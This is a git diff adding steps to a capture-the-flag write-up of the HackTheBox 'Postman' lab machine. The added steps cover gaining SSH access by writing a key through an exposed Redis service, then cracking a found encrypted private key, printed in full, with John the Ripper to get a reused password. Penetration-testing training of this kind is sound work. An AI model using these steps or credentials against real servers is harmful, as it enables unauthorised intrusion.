@@ -149,9 +149,7 @@ Lastly, we will enumerate the endpoints on https://postman:10000 with Gobuster.
 
 ## Exploit
 ### RCE via redis
-Firstly, we will create our own ssh public-private key pair using ```ssh-keygen -t rsa ```
-
-Next, we will write our public-private keypair to a file and import the file into redis
+Firstly, we will create our own ssh public-private key pair using ```ssh-keygen -t rsa ```. Next, we will write our public-private keypair to a file and import the file into redis
 ```
 ┌──(kali㉿kali)-[~/Desktop/postman]
 └─$ (echo -e "\n\n"; cat rsa.pub; echo -e "\n\n") > spaced_key.txt
@@ -161,6 +159,7 @@ Next, we will write our public-private keypair to a file and import the file int
 OK
 ```
 
+Afterwards, we will save the public key that we have imported into the _authorized_key_ file on the redis server
 ```
 10.10.10.160:6379> config get dir
 1) "dir"
@@ -174,6 +173,7 @@ OK
 10.10.10.160:6379> 
 ```
 
+Finally, we will be able to gain access to the redis server via SSH.
 ```
 ┌──(kali㉿kali)-[~/Desktop/postman]
 └─$ ssh -i rsa redis@10.10.10.160
@@ -194,6 +194,110 @@ Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
 Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
 redis@Postman:
 ```
-### Obtaining reverse shell
+
 ### Obtaining user flag
+
+However, we realize that we do not have the permissions to view the user flag. Hence, we would need to escalate our privileges to Matt
+
+```
+redis@Postman:/home$ cd
+redis@Postman:~$ cd /home/Matt
+redis@Postman:/home/Matt$ ls
+user.txt
+redis@Postman:/home/Matt$ cat user.txt
+cat: user.txt: Permission denied
+redis@Postman:/home/Matt$ 
+```
+
+Executing our LinEnum script, we discover a suspicious file /opt/id_rsa.bak belonging to Matt
+
+![id_rsa file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Postman/id_rsa.PNG)
+
+Upon furthur inspection, we realize that this is a private key belonging to Matt.
+
+```
+redis@Postman:~$ cat /opt/id_rsa.bak
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
+-----END RSA PRIVATE KEY-----
+```
+
+To crack this private key, we will first have to obtain the hash of the private key using ssh2john
+
+```
+┌──(kali㉿kali)-[~/Desktop/postman]
+└─$ wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py
+┌──(kali㉿kali)-[~/Desktop/postman]
+└─$ python ssh2john.py matt.key > matt.hash  
+```
+
+Lastly, we will use John The Ripper to obtain the password from the private key. From the output, the password to ssh into the user, Matt is ```computer2008```
+
+```
+┌──(kali㉿kali)-[~/Desktop/postman]
+└─$ john --wordlist=/home/kali/Desktop/pentest/wordlist/rockyou.txt matt.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+computer2008     (matt.key)
+1g 0:00:00:00 DONE (2021-10-22 12:10) 2.777g/s 1672Kp/s 1672Kc/s 1672KC/s percing..peque
+Session completed
+                                                                                             
+┌──(kali㉿kali)-[~/Desktop/postman]
+└─$ john --show matt.hash                                                    
+matt.key:computer2008
+
+1 password hash cracked, 0 left
+```
+
+However, we realize that when we try to SSH on our local machine, the connection is closed by the host
+
+```
+┌──(kali㉿kali)-[~/Desktop/postman]
+└─$ ssh -i matt.key matt@10.10.10.160                                                    1 ⚙
+Enter passphrase for key 'matt.key': 
+Connection closed by 10.10.10.160 port 22
+```
+
+We will try to escalate the privilege from the ```redis``` user. We have successfully gained access to Matt's SSH terminal. Now, all we have to do is to obtain the user's flag.
+
+```
+redis@Postman:~$ su Matt
+Password: 
+Matt@Postman:/var/lib/redis$ cat /home/Matt/user.txt
+<Redacted user flag>
+Matt@Postman:/var/lib/redis$
+```
 ### Obtaining root flag
